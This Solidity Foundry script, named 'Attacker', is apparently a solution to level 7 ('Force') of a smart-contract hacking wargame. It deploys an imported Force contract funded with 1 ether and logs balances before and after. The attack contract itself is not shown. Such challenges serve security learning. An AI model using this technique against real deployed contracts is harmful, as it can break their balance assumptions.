// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Force} from "../instances/Ilevel07.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        console.log("balance0: ", address(this).balance);
        Force force = new Force{value: 1 ether}(address(this));
        console.log("balance1: ", address(this).balance);
        vm.stopBroadcast();
    }
}
